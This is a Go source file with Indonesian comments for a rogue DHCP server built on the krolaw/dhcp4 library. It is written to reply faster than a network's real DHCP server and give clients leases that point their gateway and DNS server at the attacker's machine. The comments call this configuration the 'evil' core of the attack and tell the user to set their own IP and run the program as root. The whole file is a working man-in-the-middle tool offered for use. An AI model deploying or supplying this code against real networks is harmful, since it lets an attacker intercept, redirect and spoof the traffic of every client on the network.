package main

import (
	"log"
	"net"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/krolaw/dhcp4"
)

// Konfigurasi untuk Server DHCP Nakal kita
type RogueConfig struct {
	// IP dari server nakal ini (harus IP dari mesin tempat kode dijalankan)
	ServerIP net.IP
	// Range IP yang akan diberikan ke klien
	StartIP net.IP
	EndIP   net.IP
	// Opsi yang akan diberikan ke klien (ini bagian "jahat"-nya)
	Options dhcp4.Options
	// Durasi sewa IP
	LeaseDuration time.Duration
}

// RogueDHCPHandler adalah struct yang akan mengimplementasikan interface dhcp4.Handler
type RogueDHCPHandler struct {
	config *RogueConfig
	// Peta untuk melacak IP yang sudah disewakan (sangat sederhana)
	leaseDB map[string]net.IP
}

// ServeDHCP adalah metode yang wajib ada untuk mengimplementasikan dhcp4.Handler
// PERBAIKAN: Signature metode ini hanya mengembalikan dhcp4.Packet, tanpa bool.
func (h *RogueDHCPHandler) ServeDHCP(req dhcp4.Packet, msgType dhcp4.MessageType, options dhcp4.Options) dhcp4.Packet {
	clientMAC := req.CHAddr().String()

	// Konversi map `dhcp4.Options` menjadi slice `[]dhcp4.Option`
	// karena `dhcp4.ReplyPacket` membutuhkan slice, bukan map.
	opts := make([]dhcp4.Option, 0, len(h.config.Options))
	for code, value := range h.config.Options {
		opts = append(opts, dhcp4.Option{Code: code, Value: value})
	}

	switch msgType {
	case dhcp4.Discover:
		log.Printf("[DISCOVER] Dari MAC: %s", clientMAC)

		// --- LOGIKA UNTUK MEMENANGKAN "PERLOMBAAN" ---
		// Respon secepat mungkin tanpa delay.
		// Pilih IP untuk ditawarkan ke klien.
		offeredIP := dhcp4.IPAdd(h.config.StartIP, dhcp4.IPRange(h.config.StartIP, h.config.EndIP)/2)
		h.leaseDB[clientMAC] = offeredIP
		log.Printf("  -> Menawarkan IP: %s", offeredIP)

		// Kembalikan paket DHCPOFFER
		reply := dhcp4.ReplyPacket(
			req,                    // Paket permintaan asli
			dhcp4.Offer,            // Tipe pesan: Offer
			h.config.ServerIP,      // IP Server (Server Identifier)
			offeredIP,              // IP yang ditawarkan
			h.config.LeaseDuration, // Durasi sewa
			opts,                   // Gunakan slice yang sudah dikonversi
		)
		// PERBAIKAN: Hanya mengembalikan paket reply
		return reply

	case dhcp4.Request:
		log.Printf("[REQUEST] Dari MAC: %s", clientMAC)

		// Cek apakah kita yang diminta oleh klien (berdasarkan Server Identifier)
		if serverIdent, ok := options[dhcp4.OptionServerIdentifier]; ok && !net.IP(serverIdent).Equal(h.config.ServerIP) {
			// Ini permintaan untuk server lain, abaikan.
			log.Printf("  -> Request untuk server lain (%s), diabaikan.", net.IP(serverIdent))
			// PERBAIKAN: Kembalikan nil untuk tidak membalas
			return nil
		}

		// Klien meminta IP dari kita, kirim DHCPACK
		requestedIP := net.IP(options[dhcp4.OptionRequestedIPAddress])
		if requestedIP == nil {
			requestedIP = req.CIAddr()
		}

		// Gunakan IP yang kita tawarkan sebelumnya
		ackIP, ok := h.leaseDB[clientMAC]
		if !ok {
			ackIP = requestedIP // fallback
		}

		log.Printf("  -> Mengonfirmasi (ACK) IP: %s", ackIP)

		reply := dhcp4.ReplyPacket(
			req,
			dhcp4.ACK,
			h.config.ServerIP,
			ackIP,
			h.config.LeaseDuration,
			opts, // Gunakan slice yang sudah dikonversi
		)
		// PERBAIKAN: Hanya mengembalikan paket reply
		return reply

	default:
		// Abaikan tipe pesan lainnya
		// PERBAIKAN: Kembalikan nil untuk tidak membalas
		return nil
	}
}

func main() {
	// --- KONFIGURASI ---
	// Ganti ini dengan IP dari interface jaringan yang terhubung ke jaringan target.
	serverIPStr := "172.16.1.100" // <--- UBAH INI

	serverIP := net.ParseIP(serverIPStr)
	if serverIP == nil {
		log.Fatalf("IP Server tidak valid: %s", serverIPStr)
	}

	// Konfigurasi jahat kita
	config := &RogueConfig{
		ServerIP:      serverIP,
		StartIP:       net.ParseIP("172.16.1.150"),
		EndIP:         net.ParseIP("172.16.1.200"),
		LeaseDuration: 24 * time.Hour, // 24 jam
		Options: dhcp4.Options{
			// --- INI ADALAH INTI SERANGAN ---
			// 1. Router (Gateway) diatur ke IP kita.
			dhcp4.OptionRouter: []byte(serverIP),
			// 2. DNS Server diatur ke IP kita.
			dhcp4.OptionDomainNameServer: []byte(serverIP),
			// 3. Subnet Mask
			dhcp4.OptionSubnetMask: []byte{255, 255, 255, 0},
		},
	}

	// --- SETUP JARINGAN ---
	// DHCP bekerja di port 67 (server) dan 68 (client). Kita perlu listen di port 67.
	conn, err := net.ListenPacket("udp4", ":67")
	if err != nil {
		log.Fatalf("Gagal membuat listener di port 67. Apakah Anda menjalankan sebagai root/administrator? Error: %v", err)
	}
	defer conn.Close()

	log.Printf("🚨 Server DHCP Nakal Berjalan! 🚨")
	log.Printf("IP Server Nakal: %s", config.ServerIP)
	log.Printf("Range IP yang ditawarkan: %s - %s", config.StartIP, config.EndIP)
	log.Printf("Gateway Jahat: %s", config.Options[dhcp4.OptionRouter])
	log.Printf("DNS Jahat: %s", config.Options[dhcp4.OptionDomainNameServer])
	log.Println("Tekan Ctrl+C untuk menghentikan.")

	// Buat instance dari handler kita
	handler := &RogueDHCPHandler{
		config:  config,
		leaseDB: make(map[string]net.IP),
	}

	// Setup untuk graceful shutdown
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)

	// Jalankan server DHCP di goroutine terpisah menggunakan fungsi bantuan `dhcp4.Serve`
	go func() {
		if err := dhcp4.Serve(conn, handler); err != nil {
			log.Printf("Server DHCP berhenti: %v", err)
		}
	}()

	// Tunggu sinyal shutdown (Ctrl+C)
	<-c
	log.Println("\nMenghentikan server...")
	// Menutup koneksi akan menyebabkan dhcp4.Serve berhenti.
	conn.Close()
	log.Println("Server dihentikan.")
}
